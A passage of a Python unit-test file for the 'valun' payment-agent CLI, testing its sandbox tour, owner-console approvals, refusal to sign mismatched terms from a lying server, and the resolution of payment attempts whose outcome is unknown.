            self.addCleanup(p.stop)

    def sent(self):
        """The X-Valun-Features values sent since the last call (None: no header), in order."""
        out = [caps for _m, _route, caps in self.heads]
        del self.heads[:]
        return out

    def tour(self):
        rc, out = self.run_cli('sandbox', 'tour', '--yes')
        self.assertEqual(rc, 0, out[-3000:])
        self.assertEqual(Tour.tour_lines(self, out), TOUR_TOTALS)
        self.assertIn('The tour is complete', out)
        setoffs = [j for j in self.world.journal if j['kind'] == 'setoff' and j['ref'] != 'vs_server']
        self.assertEqual(len({j['ref'] for j in setoffs}), 2)                     # the 2-cycle and the 3-cycle, signed by S
        self.assertEqual(self.world.s_roles, {'setoff', 'issuer', 'creditor'})
        self.assertEqual(self.disk()['consent_roles_declared'], 'setoff,issuer,creditor')

    def test_a_fresh_joiners_tour_declares_the_roles_it_signs(self):
        self.join()
        self.assertEqual(self.world.s_roles, set())       # join's own agent requests come before it read GET /info
        self.sent()
        self.tour()
        heads = self.sent()
        self.assertIn(self.FULL, heads)
        self.assertEqual(set(heads) - {None}, {self.FULL})                         # never another list, never the empty one

    def test_the_tour_never_withdraws_the_roles_valun_call_declared(self):
        self.join()
        rc, out = self.run_cli('call', 'valun_status')     # its hook is on: it declares the roles the profile signs
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.world.s_roles, {'setoff', 'issuer', 'creditor'})
        self.sent()
        self.tour()
        self.assertNotIn('consents/1;roles=', self.sent())


class FakeTourClient:
    """Just what tour() needs from a client, for the stop and rate-limit tests."""

    def __init__(self):
        self.state, self.connected, self.runs = {'consent_policy': dict(va.SANDBOX_CONSENT_POLICY)}, True, []

    def me(self):
        return {'participant': {'sandbox_only': True}}

    def info(self):
        return {'features': list(CIRC)}

    def process_consents(self, policy=None, now_ms=None):
        self.runs.append(now_ms)
        self.state['consents_last_run_ms'] = now_ms
        return {'signed': [], 'refused': [], 'waiting': []}


class FakeTourAgent:
    """An agent whose sandbox_next_steps always ask to pay a delivery, and whose prepare() always refuses."""

    def __init__(self, refusal):
        self.refusal, self.prepares, self.c = refusal, 0, FakeTourClient()

    def client(self):
        return self.c

    def status(self, a):
        return {'sandbox_next_steps': {'tour_step': 2, 'of': 5, 'goal': 'spend a note you hold', 'then': 'wait',
                                       'next_calls': [{'tool': 'valun_review_delivery', 'why': 'pay it',
                                                       'arguments': {'deal_id': 'vd_0123456789abcdef', 'decision': 'accept',
                                                                     'pay_with': 'sandbox-exact'}}]}}

    def is_commitment(self, name, args):
        return True

    def prepare_or_refusal(self, name, args):
        self.prepares += 1
        return None, dict(self.refusal)

    def call(self, name, args):
        raise AssertionError('nothing is called after a refusal')


class StepTourClient(FakeTourClient):
    """FakeTourClient, plus what tour() reads when a step is done (its edges and the directory)."""
    pubkey = '02' + '11' * 32

    def sync_edges(self, now_ms=None):
        return {'edges': {}, 'doubtful': []}

    def directory(self):
        return []


class StepTourAgent:
    """An agent whose sandbox_next_steps are: in step 2, `disputes` times, to dispute a wrong delivery (each dispute
    goes through); then, in step 3, every time, a call that fails."""

    def __init__(self, disputes):
        self.left, self.calls, self.c = disputes, [], StepTourClient()

    def client(self):
        return self.c

    def status(self, a):
        if self.left > 0:
            step, call = 2, {'tool': 'valun_review_delivery', 'why': 'the delivery is wrong',
                             'arguments': {'deal_id': 'vd_0123456789abcdef', 'decision': 'dispute', 'reason': 'wrong'}}
        else:
            step, call = 3, {'tool': 'valun_respond', 'why': 'buy notary', 'arguments': {'deal_id': 'vd_1123456789abcdef'}}
        return {'sandbox_next_steps': {'tour_step': step, 'of': 5, 'goal': 'go on', 'then': 'wait', 'next_calls': [call]}}

    def is_commitment(self, name, args):
        return False

    def call(self, name, args):
        self.calls.append((name, args.get('decision')))
        if args.get('decision') == 'dispute':
            self.left -= 1
            return {'status': 'disputed'}
        raise vc.ValunError('insufficient_claim', 'not yet')


class TourStops(unittest.TestCase):
    def setUp(self):
        self.clock, self.sleeps = [1_793_966_460.0], []

        def sleep(s):
            self.sleeps.append(s)
            self.clock[0] += max(s, 0.001)
        p = mock.patch.object(sb, 'time', types.SimpleNamespace(time=lambda: self.clock[0], sleep=sleep))
        p.start()
        self.addCleanup(p.stop)

    def refusal(self, cause):
        return {'error': 'approval_unbound', 'message': 'could not read what you would sign; nothing was signed', 'cause': cause}

    def test_the_tour_stops_on_the_cause_of_a_refusal(self):
        for cause in ('attempt_outcome_unknown', 'records_unreadable', 'feature_unavailable'):
            ag, lines = FakeTourAgent(self.refusal(cause)), []
            with self.assertRaises(vc.ValunError) as e:
                sb.tour(None, yes=True, log=lines.append, agent=ag)
            self.assertEqual((e.exception.code, ag.prepares, self.sleeps), (cause, 1, []), cause)
        self.assertIn('valun attempts resolve', va.error_payload(vc.ValunError('attempt_outcome_unknown', 'x'))['what_this_means'])

    def test_a_failed_call_is_waited_on_and_consents_keep_their_rate(self):
        ag = FakeTourAgent(self.refusal('insufficient_claim'))
        with self.assertRaises(vc.ValunError) as e:
            sb.tour(None, yes=True, log=lambda line: None, agent=ag, poll_s=3)
        self.assertEqual(e.exception.code, 'tour_stuck')
        self.assertEqual((ag.prepares, self.sleeps), (12, [3] * 12))      # one wait after each failed call
        self.assertEqual(len(ag.c.runs), 1)                               # 36 s of waiting: one consent run (60 s rate)

    def test_the_dispute_allowance_ends_with_its_step(self):
        # FX2-PY: three wrong deliveries disputed in step 2 allow step 2 six more calls, not step 3: there the usual
        # TOUR_CALLS_PER_STEP failed calls end the tour (disputes_in_step starts again at 0 with each step).
        ag, lines = StepTourAgent(disputes=3), []
        with self.assertRaises(vc.ValunError) as e:
            sb.tour(None, yes=True, log=lines.append, agent=ag, poll_s=3)
        self.assertEqual(e.exception.code, 'tour_stuck')
        self.assertIn(f'step 3 did not finish after {sb.TOUR_CALLS_PER_STEP} tool calls', str(e.exception))
        self.assertEqual(ag.calls, [('valun_review_delivery', 'dispute')] * 3 + [('valun_respond', None)] * sb.TOUR_CALLS_PER_STEP)
        self.assertIn('step 2 done. Your edges on the tracker: none', lines)


class OwnerWaitTourAgent:
    """An agent whose sandbox_next_steps are `plans`, one per valun_status (the last one repeats): what a tour with
    console approvals sees while the owner approves each held step a few polls late."""

    def __init__(self, plans):
        self.plans, self.calls, self.c = list(plans), [], StepTourClient()

    def client(self):
        return self.c

    def status(self, a):
        return {'sandbox_next_steps': dict(self.plans.pop(0) if len(self.plans) > 1 else self.plans[0])}

    def is_commitment(self, name, args):
        return False

    def call(self, name, args):
        self.calls.append(name)
        return {'what_happened': f'{name}: sent'}


class TourOwnerWaits(unittest.TestCase):
    """The first-tester readiness assessment of 2026-11-18 (blocker 3, tour-run.out): with console approvals the tour
    logged "step N done", with that step's edges, each time it began to wait for the owner (the owner-wait plan names
    no step), then announced the same step again once the owner approved. A step is done only when the tour moves on
    to a later step or ends; while the owner decides, the tour says what waits and where to approve it."""
    setUp = TourStops.setUp
    WHERE = ('Your owner must first approve a commitment in the owner console, https://valun.example/pilot#owner (deal '
             'vd_0123456789abcdef, approval va_0123456789ab; in a terminal, `valun --profile s console` opens it); tell '
             'them, then call valun_status again.')

    def plan(self, step, tool=None, then='wait'):
        calls = [{'tool': tool, 'why': tool, 'arguments': {}}] if tool else []
        return {'tour_step': step, 'of': 5, 'goal': f'goal {step}', 'then': then, 'next_calls': calls}

    def test_a_step_waiting_for_the_owner_is_not_done(self):
        owner = self.plan(None, then=self.WHERE)
        ag = OwnerWaitTourAgent([self.plan(1, 'valun_propose'), owner, owner, self.plan(1, 'valun_deliver'), self.plan(1),
                                 self.plan(2, 'valun_propose'), owner, self.plan(2, 'valun_review_delivery'),
                                 self.plan('done', then='The tour is complete.')])
        lines = []
        r = sb.tour(None, yes=True, log=lines.append, agent=ag, poll_s=3)
        self.assertEqual(lines, ['step 1 of 5: goal 1', '  -> valun_propose: valun_propose', '     valun_propose: sent',
                                 f'  ... {self.WHERE}',
                                 '  -> valun_deliver: valun_deliver', '     valun_deliver: sent', '  ... wait',
                                 'step 1 done. Your edges on the tracker: none',
                                 'step 2 of 5: goal 2', '  -> valun_propose: valun_propose', '     valun_propose: sent',
                                 f'  ... {self.WHERE}',
                                 '  -> valun_review_delivery: valun_review_delivery', '     valun_review_delivery: sent',
                                 'step 2 done. Your edges on the tracker: none', 'The tour is complete.'])
        self.assertEqual((r['done'], [s['step'] for s in r['steps']]), (True, [1, 2]))

    def test_the_last_steps_totals_are_read_when_the_tour_ends_after_the_owners_last_approval(self):
        """The 0.7.1 staging run (2026-11-17): with console approvals, step 5's "Your edges on the tracker" was printed
        while its last payment still waited for the owner, so its totals were stale. A step's totals are read once the
        tour moves past it or ends, so the last ones come after the owner's last approval (the candidate's staging test,
        2026-11-18: at 05:21:57, after the approval of 05:21:43, every edge at 0)."""
        owner = self.plan(None, then=self.WHERE)
        ag = OwnerWaitTourAgent([self.plan(5, 'valun_review_delivery'), owner, owner,
                                 self.plan('done', then='The tour is complete.')])
        edge = f"{'03' + '22' * 32}>{ag.c.pubkey}"
        # the claim is cleared once the owner approved the last payment (the plans the agent has left say so)
        ag.c.sync_edges = lambda now_ms=None: {'edges': {edge: {'total': 0 if len(ag.plans) == 1 else 2_000_000}},
                                               'doubtful': []}
        lines = []
        r = sb.tour(None, yes=True, log=lines.append, agent=ag, poll_s=3)
        done = [x for x in lines if x.startswith('step 5 done')]
        self.assertEqual(len(done), 1, lines)
        self.assertGreater(lines.index(done[0]), lines.index(f'  ... {self.WHERE}'), 'never before the owner approved')
        self.assertIn(f"{'03' + '22' * 7}... -> you: 0 ", done[0])
        self.assertEqual(lines[-1], 'The tour is complete.')
        self.assertEqual(r['steps'][-1]['tracker_totals'], {f"{'03' + '22' * 7}... -> you": 0})

    def test_a_tour_that_starts_while_the_owner_decides_names_no_step_done(self):
        # an earlier run's offer still waits for the owner; a step that goes back (a deal ended) is not done either
        owner = self.plan(None, then=self.WHERE)
        ag = OwnerWaitTourAgent([owner, self.plan(3, 'valun_propose'), self.plan(2, 'valun_propose'), self.plan(3),
                                 self.plan(4, 'valun_propose'), self.plan('done', then='The tour is complete.')])
        lines = []
        r = sb.tour(None, yes=True, log=lines.append, agent=ag, poll_s=3)
        self.assertEqual([x for x in lines if x.startswith('step ') or x.startswith('  ... ')],
                         [f'  ... {self.WHERE}', 'step 3 of 5: goal 3', 'step 2 of 5: goal 2', 'step 3 of 5: goal 3',
                          '  ... wait', 'step 3 done. Your edges on the tracker: none', 'step 4 of 5: goal 4',
                          'step 4 done. Your edges on the tracker: none'])
        self.assertEqual([s['step'] for s in r['steps']], [3, 4])


class LyingTourClient(StepTourClient):
    """A client of a server that lies in its inbox: the deal's verified terms are what `terms` says."""
    participant_id = 'vp_0000000000me'

    def __init__(self, terms):
        super().__init__()
        self.terms, self.h = terms, vc.terms_hash(terms)

    def directory(self):
        return [{'handle': 'sandbox-exact', 'id': 'vp_00000000exact'}, {'handle': 'sandbox-mallory', 'id': 'vp_0000000mallory'},
                {'handle': 'stranger', 'id': 'vp_000000stranger'}]

    def deal(self, did):
        return {'id': did}

    def verify_offer(self, d):
        return {'terms_hash': self.h, 'terms': self.terms}

    def verified_agreement(self, d):
        return self.terms


class LyingTourAgent:
    """sandbox_next_steps (from the lying inbox) ask to accept an offer 'from sandbox-exact at 2 PC'; prepare() binds
    the terms the server really serves (expected_terms_hash), and its text shows them."""

    def __init__(self, terms, call=None):
        self.c, self.calls = LyingTourClient(terms), []
        self.next = call or {'tool': 'valun_respond', 'why': 'buy notary from sandbox-exact for 2 PC',
                             'arguments': {'deal_id': 'vd_0123456789abcdef', 'action': 'accept'}}

    def client(self):
        return self.c

    def status(self, a):
        if self.calls:
            return {'sandbox_next_steps': {'tour_step': 'done', 'then': 'The tour is complete.'}}
        return {'sandbox_next_steps': {'tour_step': 2, 'of': 5, 'goal': 'go on', 'then': 'wait', 'next_calls': [self.next]}}

    def is_commitment(self, name, args):
        return True

    def prepare_or_refusal(self, name, args):
        bound = dict(args, expected_terms_hash=self.c.h)
        if name == 'valun_review_delivery':
            bound['expected_deliverable_sha256'] = 'bb' * 32
        return {'args': bound, 'text': f'Valun - {name} (what the server serves)'}, None

    def call(self, name, args):
        self.calls.append((name, args))
        return {'status': 'accepted'}


def tour_terms(payee='vp_00000000exact', payer=LyingTourClient.participant_id, price=2, service='notary'):
    return {'payer': {'id': payer}, 'payee': {'id': payee}, 'price': {'amount': price},
            'service': {'title': f'{service} job', 'description': f'{service} for this text', 'deliverable': 'JSON'}}


class TourYesChecksWhatIsSigned(unittest.TestCase):
    """Audit AI-3: `valun sandbox tour --yes` approves a commitment only when what prepare() bound is what the tour
    would do: a sandbox agent as the other party (directory ids), at most the published price to pay, and the other
    sandbox agent's note to pay with. Otherwise the tour stops (tour_unverified), and nothing is signed."""

    setUp = TourStops.setUp

    def run_tour(self, ag):
        lines = []
        sb.tour(None, yes=True, log=lines.append, agent=ag, poll_s=3)
        return lines

    def test_an_offer_whose_signed_terms_name_another_party_or_price_is_not_signed(self):
        for terms in (tour_terms(payee='vp_000000stranger'), tour_terms(price=30), tour_terms(price=3)):
            ag = LyingTourAgent(terms)
            with self.assertRaises(vc.ValunError) as e:
                self.run_tour(ag)
            self.assertEqual((e.exception.code, ag.calls), ('tour_unverified', []), terms)
        ag = LyingTourAgent(tour_terms())                       # what the tour would do itself: approved
        self.assertIn('The tour is complete.', self.run_tour(ag))
        self.assertEqual([n for n, _a in ag.calls], ['valun_respond'])
        # an asking owner decides instead of stopping
        ag = LyingTourAgent(tour_terms(price=30))
        sb.tour(None, yes=True, ask=lambda text: True, log=lambda line: None, agent=ag, poll_s=3)
        self.assertEqual(len(ag.calls), 1)
        # With console approvals the stop says so (the 0.7.2 review: "run it without --yes" changes nothing there)
        ag = LyingTourAgent(tour_terms(price=30))
        with self.assertRaises(vc.ValunError) as e:
            sb.tour(None, yes=True, log=lambda line: None, agent=ag, poll_s=3, console=True)
        self.assertEqual((e.exception.code, ag.calls), ('tour_unverified', []))
        self.assertIn("with console approvals it signs by itself only what the tour's own rules allow", str(e.exception))
        self.assertNotIn('without --yes', str(e.exception))

    def test_a_payment_with_a_held_note_must_use_the_other_sandbox_agents_note(self):
        call = {'tool': 'valun_review_delivery', 'why': 'pay it', 'arguments': {'deal_id': 'vd_0123456789abcdef',
                                                                                 'decision': 'accept', 'pay_with': None}}
        for pay_with, ok in (('vp_0000000mallory', True), ('own_note', True), ('vp_000000stranger', False),
                             ('vp_00000000exact', False)):
            ag = LyingTourAgent(tour_terms(), dict(call, arguments=dict(call['arguments'], pay_with=pay_with)))
            if ok:
                self.run_tour(ag)
                self.assertEqual(len(ag.calls), 1, pay_with)
            else:
                with self.assertRaises(vc.ValunError) as e:
                    self.run_tour(ag)
                self.assertEqual((e.exception.code, ag.calls), ('tour_unverified', []), pay_with)

    def test_a_terms_hash_other_than_the_prepared_one_is_refused(self):
        ag = LyingTourAgent(tour_terms())
        self.assertIn('not the ones prepared', sb.tour_rules_problem(ag, 'valun_respond', {
            'deal_id': 'vd_0123456789abcdef', 'action': 'accept', 'expected_terms_hash': 'cc' * 32}, {}))
        self.assertIn('sandbox agents', sb.tour_rules_problem(ag, 'valun_propose', {
            'counterparty': 'vp_000000stranger', 'role': 'payer', 'price': 2}, {}))
        self.assertIsNone(sb.tour_rules_problem(ag, 'valun_propose', {'counterparty': 'vp_0000000mallory', 'role': 'payer',
                                                                      'price': 2}, {}))


class EarnChecks(Cli):
    def lying_inbox(self, did):
        """The inbox says: the sandbox agent sandbox-exact offers you a job as payee."""
        self.world.inbox = lambda: {'respond': [{'deal_id': did, 'counterparty': 'sandbox-exact', 'your_role': 'payee'}],
                                    'deliver': [], 'review_delivery': [], 'awaiting_your_owner': [], 'waiting_on_others': [],
                                    'recent_closed': []}

    def test_earn_accepts_only_a_job_for_me_as_payee_from_a_sandbox_agent(self):
        self.world.welcome = False
        self.join()
        job = ('text-stats job', 'text-stats for this text:\n```\nhi\n```', 'the exact result as JSON')
        for payer, payee, proposer, code in ((S_ID, X_ID, X_ID, 'not_payee'),             # I would pay, not earn
                                             (O_ID, S_ID, O_ID, 'not_sandbox_agent')):    # not from a sandbox agent
            did = self.world.add_deal(payer, payee, *job, 3, proposer=proposer)['id']
            self.lying_inbox(did)
            rc, out = self.run_cli('sandbox', 'earn')
            self.assertEqual((rc, json.loads(out.strip().splitlines()[-1])['error']), (1, code))
            self.assertEqual(self.world.deals[did]['status'], 'open')                    # not accepted
        self.assertFalse([p for m, p, _b in self.world.log if m == 'POST' and p.endswith('/accept')])


class BuyExitCode(Cli):
    def test_a_payment_that_did_not_apply_exits_non_zero(self):
        self.world.welcome = False
        self.world.wrong_left = 0
        self.world.pay_due = True
        self.join()
        self.world.set_edge(X_ID, S_ID, 3, now_ms() - 60_000)
        rc, out = self.run_cli('sandbox', 'buy', 'sandbox-mallory', 'notary', '--text', 'hello', '--pay-with', 'sandbox-exact')
        r = json.loads(out.strip().splitlines()[-1])
        self.assertEqual((rc, r['status'], r['verified'], r['paid']), (1, 'payment_due', True, False))


class AttemptsCommands(Cli):
    """`valun attempts list | resolve` (decision D-2 d): owner-run, at a terminal, with a confirmation (two when only the
    client's records record it) and the owner token used once, against a World that answers like valun-app FX-SV
    (GET /transfers/:vt; the resolve route takes transfers held as outcome_unknown or inconsistent only)."""

    def with_attempt(self, tid='vt_0123456789abcdef', server_state='outcome_unknown', join=True):
        """A transfer attempt of mine (paying with sandbox-exact's note: my claim 3 -> 1 PC) whose server id my client
        recorded, on a delivered deal; the server holds it as server_state."""
        if join:
            self.world.welcome = False
            self.join()
        disk = self.disk()
        T = now_ms() - 120_000 - (now_ms() - 120_000) % 1000 + 999 - 1000
        deal = self.world.add_deal(S_ID, M_ID, 'notary job', 'notary for this text:\n```\nhi\n```', 'the exact result', 2,
                                   proposer=M_ID)['id']            # offered by sandbox-mallory (the World holds its key)
        self.world.deals[deal]['status'] = 'delivered'
        self.T, self.deal = T, deal
        self.edge = f"{self.world.pk(X_ID)}>{self.world.pk(S_ID)}"
        disk.setdefault('transfer_attempts', {})[deal] = [{
            'deal_id': deal, 'route': 'transfer', 'edge': self.edge, 'prior': 3, 'prior_timestamp': T - 50_000,
            'prior_signature': None, 'total': 1, 'timestamp': T, 'quote_digest': None, 'signed_at': None, 'attempt_id': tid}]
        self.write(disk)
        self.world.add_transfer(tid, deal, server_state, T, (self.edge, {'total': 3, 'timestamp': T - 50_000, 'signature': '00'}, 1),
                                (self.world.edge(X_ID, M_ID), None, 2), 2)
        return deal

    def write(self, disk):
        with open(os.path.join(self.home.name, 'profiles', 's.json'), 'w', encoding='utf-8') as f:
            json.dump(disk, f)

    def keyed_profile(self):
        """A joined profile with the stranger's throwaway key (written here), so that the World can hold states S signed."""
        from test_agent_circulation import NFT, DENOM, S
        self.world.keys[S_ID] = S
        self.world.welcome = False
        os.makedirs(os.path.join(self.home.name, 'profiles'), exist_ok=True)
        self.write({'server': SERVER, 'participant_id': S_ID, 'pubkey': S['pubkey'], 'secret': S['secret'].hex(),
                    'agent_token': 'vpa_test-only', 'approvals': 'none', 'consent_policy': dict(va.SANDBOX_CONSENT_POLICY),
                    'consent_loop': 'off', 'pins': {'tracker_nft_id': NFT, 'denomination': DENOM}})
        with open(self.token_file, 'w', encoding='utf-8') as f:
            f.write('vpo_test-only\n')
        return S

    def client(self):
        return vc.Client(vc.FileStore(os.path.join(self.home.name, 'profiles', 's.json')), server=SERVER)

    def test_list(self):
        self.with_attempt()
        rc, out = self.run_cli('attempts', 'list')
        self.assertEqual(rc, 0, out)
        self.assertIn(f'deal {self.deal}', out)
        self.assertIn('#1 paying with the note of ', out)
        self.assertIn('your claim 3 -> 1 PC', out)
        self.assertIn('server id vt_0123456789abcdef: can still apply', out)

    def test_list_first_learns_what_the_owner_decided(self):
        """The review's mutation run: removing the refresh in `valun attempts list` failed no test. A payment by transfer
        the server held for the owner, who rejected it in the owner console, is listed as not applied once the deal view
        is read, with what may be signed now: a payment through the same IOU, never a new IOU of the deal."""
        deal = self.with_attempt(server_state='void_rejected')
        disk = self.disk()
        disk['transfer_attempts'][deal][0]['approval_id'] = 'va_27df22079678'
        self.write(disk)
        view = self.world.view

        def with_approval(did):
            out = view(did)
            if did == deal:
                out['approvals'] = [{'id': 'va_27df22079678', 'deal_id': deal, 'kind': 'pay_by_transfer', 'state': 'rejected',
                                     'created_at': '2026-11-17T23:00:00.000Z', 'decided_at': '2026-11-17T23:01:00.000Z'}]
            return out
        self.world.view = with_approval
        rc, out = self.run_cli('attempts', 'list')
        self.assertEqual(rc, 0, out)
        self.assertIn('not applied (the server held it for your owner, who rejected it in the owner console, and never sent '
                      'it on). A payment through the same IOU at the same prior state can be signed now; your own IOU or any '
                      f'other payment of this deal waits until after {va.free_after(self.T)}', out)
        self.assertEqual(self.disk()['transfer_attempts'][deal][0]['outcome'], 'not_applied')

    def test_resolve_asks_at_a_terminal_and_uses_the_owner_token_once(self):
        self.with_attempt()
        args = ('attempts', 'resolve', self.deal, 'vt_0123456789abcdef', '--not-applied', '--owner-token-file', self.token_file)
        rc, out = self.run_cli(*args)                               # no person at this terminal
        self.assertEqual((rc, self.world.resolutions), (3, []))
        rc, out = self.run_cli(*args, tty=True, answers=['n'])      # the owner says no
        self.assertEqual((rc, self.world.resolutions), (3, []))
        self.assertIn('NOT APPLIED', out)
        self.assertIn('The server is told first', out)
        posts = len(self.world.log)                                  # a note the server would refuse: nothing asked
        rc, out = self.run_cli(*args, '--note', 'x' * 301, tty=True, answers=[])
        self.assertEqual((rc, len(self.world.log)), (1, posts))
        self.assertIn('longer than 300 characters', out)
        rc, out = self.run_cli(*args, tty=True, answers=['y'])
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.world.resolutions, [(self.deal, 'vt_0123456789abcdef', {'outcome': 'not_applied'}, 'vpo_test-only')])
        self.assertEqual(self.disk()['transfer_attempts'][self.deal][0]['outcome'], 'not_applied')
        self.assertNotIn('vpo_test-only', json.dumps(self.disk()))  # the owner token is not stored
        self.assertIn('The server recorded your decision.', out)
        # --applied, with the token from a hidden prompt, for another attempt: the deal is recorded as paid
        other = self.with_attempt('vt_1123456789abcdef', join=False)
        with mock.patch.object(cli.getpass, 'getpass', return_value='vpo_test-only') as prompt:
            rc, out = self.run_cli('attempts', 'resolve', other, '#1', '--applied', tty=True, answers=['y'])
        self.assertEqual(rc, 0, out)
        self.assertEqual(prompt.call_count, 1)
        self.assertEqual(self.world.resolutions[-1][:3], (other, 'vt_1123456789abcdef', {'outcome': 'applied'}))
        self.assertEqual(self.disk()['records']['paid_deals'][other]['route'], 'transfer')

    def test_a_bound_note_whose_outcome_is_unknown_is_resolved_in_the_records_and_the_deal_paid_later(self):
        # A bound note of mine (held for my owner and rejected, say) acknowledged my debt to sandbox-mallory at 2 PC; a
        # set-off later moved that edge past it to 1 PC, so my client cannot tell whether it applied. The server holds no
        # payment attempt for a credit note: `resolve #1 --not-applied` changes my records only, and once the note's
        # window has passed the deal is paid with a new note.
        S = self.keyed_profile()
        w = self.world
        did = w.delivered_deal(payer=S_ID, payee=M_ID, service='notary', text='hello')
        mk = w.pk(M_ID)
        t0 = now_ms() - 3 * 3_600_000
        ts = t0 + 600_000 - (t0 + 600_000) % 1000 + 997
        w.set_edge(S_ID, M_ID, 2, t0, signature=sign_note(S, mk, 2, t0))
        disk = self.disk()
        disk['transfer_attempts'] = {did: [{'deal_id': did, 'route': 'note', 'edge': w.edge(S_ID, M_ID), 'prior': 2,
                                            'prior_timestamp': t0, 'prior_signature': sign_note(S, mk, 2, t0), 'total': 4,
                                            'timestamp': ts, 'quote_digest': None, 'signed_at': None}]}
        self.write(disk)
        w.set_edge(S_ID, M_ID, 1, ts + 1001, kind='setoff', ref='vs_0123456789abcdef', signature=sign_note(S, mk, 1, ts + 1001))
        rc, out = self.run_cli('attempts', 'list')
        self.assertEqual(rc, 0, out)
        self.assertIn('#1 your credit note to ', out)
        self.assertIn('MAY HAVE APPLIED', out)
        with self.assertRaises(vc.ValunError) as e:
            self.client().complete(did)
        self.assertEqual(e.exception.code, 'attempt_outcome_unknown')
        rc, out = self.run_cli('attempts', 'resolve', did, '#1', '--not-applied', '--owner-token-file', self.token_file,
                               tty=True, answers=['y'])                # one confirmation: the server holds nothing here
        self.assertEqual(rc, 0, out)
        self.assertIn('The server holds no payment attempt for a credit note', out)
        self.assertEqual(w.resolutions, [])
        self.assertIn('GET /pilot/v1/owner', w.requests())           # the owner token was checked
        self.assertEqual(self.disk()['transfer_attempts'][did][0]['outcome'], 'not_applied')
        self.assertEqual(self.client().complete(did)['status'], 'note_issued')   # its window passed long ago
        self.assertEqual(w.total(S_ID, M_ID), 3)

    def test_a_transfer_the_server_holds_as_ended_needs_a_second_confirmation(self):
        # The server ended the transfer (failed): it has nothing to resolve (it would answer 409 wrong_state). The owner
        # is told so and asked a second time before the decision is recorded in the client's records only.
        self.with_attempt(server_state='failed')
        args = ('attempts', 'resolve', self.deal, '#1', '--not-applied', '--owner-token-file', self.token_file)
        rc, out = self.run_cli(*args, tty=True, answers=['y', 'n'])
        self.assertEqual(rc, 3, out)
        self.assertIn('The server holds this transfer as failed', out)
        self.assertNotIn('outcome', self.disk()['transfer_attempts'][self.deal][0])
        rc, out = self.run_cli(*args, tty=True, answers=['y', 'y'])
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.world.resolutions, [])
        self.assertEqual(self.disk()['transfer_attempts'][self.deal][0]['outcome'], 'not_applied')
        self.assertNotIn('The server recorded your decision', out)

    def r22(self, server_state):
        """Readiness R-22: my transfer attempt (my claim 3 -> 1 PC) that the server holds as server_state; then a second
        deal paid with the same note moved my claim 3 -> 1, the total that attempt would have left, later: my client
        cannot prove the first attempt dead from the edges alone. Returns `valun attempts list`'s line for it, and all."""
        self.with_attempt(server_state=server_state)
        disk = self.disk()
        first = disk['transfer_attempts'][self.deal][0]
        second = 'vd_' + 'c' * 16
        disk['transfer_attempts'][second] = [dict(first, deal_id=second, timestamp=self.T + 60_000, attempt_id='vt_' + 'c' * 16)]
        disk.setdefault('records', {})['paid_deals'] = {second: {'route': 'transfer', 'edge': self.edge, 'total': 1,
                                                                 'timestamp': self.T + 60_000}}
        self.write(disk)
        self.world.set_edge(X_ID, S_ID, 1, self.T + 60_000)
        rc, out = self.run_cli('attempts', 'list')
        self.assertEqual(rc, 0, out)
        lines = out.splitlines()
        at = lines.index(f'deal {self.deal}')
        self.assertTrue(lines[at + 1].startswith('  #1 paying with the note of '), lines[at + 1])
        return lines[at + 1], out

    def test_r22_an_attempt_the_server_ended_is_listed_as_ended_with_no_resolution_advised(self):
        for state, why in (('void_rejected', 'your owner rejected it, before anyone else signed'),
                           ('cancelled', 'your client cancelled it while it collected signatures')):
            line, out = self.r22(state)
            self.assertIn('your claim 3 -> 1 PC', line)
            self.assertTrue(line.endswith(f': ended by the server ({state}: {why}), which says it never reached the tracker, '
                                          "so it did not apply; your client cannot check that on the tracker, so it still "
                                          'pays this deal no more by itself'), line)
            self.assertNotIn('MAY HAVE APPLIED', out)
            self.assertNotIn('attempts resolve', out)              # no resolution advised (in any form)
            self.assertIn('GET /pilot/v1/transfers/vt_0123456789abcdef', self.world.requests())
            self.doCleanups()                                      # a fresh home and World for the next
            self.setUp()

    def test_r22_a_server_state_that_proves_nothing_still_says_may_have_applied(self):
        for state in ('failed', 'outcome_unknown', 'resolved_not_applied'):
            line, out = self.r22(state)
            self.assertTrue(line.endswith(': MAY HAVE APPLIED: your client pays this deal no more until you resolve it'), line)
            self.assertIn('`valun --profile s attempts resolve DEAL ATTEMPT --applied`', out)
            self.doCleanups()                                      # a fresh home and World for the next
            self.setUp()

    def test_resolving_an_attempt_the_server_ended_says_so(self):
        # The owner may still record a decision (in the client's records only): told that the server ended it before it
        # reached the tracker, and, for --applied, that the client would then never pay the deal again.
        self.r22('void_rejected')
        rc, out = self.run_cli('attempts', 'resolve', self.deal, '#1', '--applied', '--owner-token-file', self.token_file,
                               tty=True, answers=['n'])
        self.assertEqual(rc, 3, out)
        self.assertIn('  The server ended this transfer as void_rejected before it ever reached the tracker: on its word the '
                      'payment did not apply, and the server has nothing to resolve.', out)
        self.assertIn('  The server says this payment never applied: recorded as applied, your client never pays this deal '
                      'again.', out)
        self.assertIn('ended by the server (void_rejected: ', [x for x in out.splitlines() if x.endswith('<- this one')][0])
        rc, out = self.run_cli('attempts', 'resolve', self.deal, '#1', '--not-applied', '--owner-token-file', self.token_file,
                               tty=True, answers=['n'])
        self.assertEqual(rc, 3, out)
        self.assertNotIn('recorded as applied, your client never pays', out)
        self.assertEqual(self.world.resolutions, [])

    def test_a_409_from_the_server_is_shown_and_asked_about(self):
        # GET /transfers showed it unresolved; the server ended it before the POST and answers 409 wrong_state.
        self.with_attempt()
        route = f'POST /pilot/v1/owner/deals/{self.deal}/attempts/vt_0123456789abcdef/resolve'
        refused = vc.ValunError('wrong_state', 'this payment attempt is failed\x1b[2J; only one whose outcome is unknown is '
                                               'resolved by its owner', 409)
        args = ('attempts', 'resolve', self.deal, '#1', '--not-applied', '--owner-token-file', self.token_file)
        self.world.fail[route] = [refused]
        rc, out = self.run_cli(*args, tty=True, answers=['y', 'n'])     # asked again after the 409: no
        self.assertEqual(rc, 3, out)
        self.assertNotIn('outcome', self.disk()['transfer_attempts'][self.deal][0])
        self.world.fail[route] = [refused]
        rc, out = self.run_cli(*args, tty=True, answers=['y', 'y'])
        self.assertEqual(rc, 0, out)
        self.assertIn('The server did not resolve it (wrong_state): ', out)
        self.assertNotIn('\x1b', out)                                 # server text is shown as plain text
        self.assertEqual(self.world.resolutions, [])
        self.assertEqual(self.disk()['transfer_attempts'][self.deal][0]['outcome'], 'not_applied')

    def test_applied_refused_because_the_payees_edge_does_not_show_it_says_what_to_do(self):
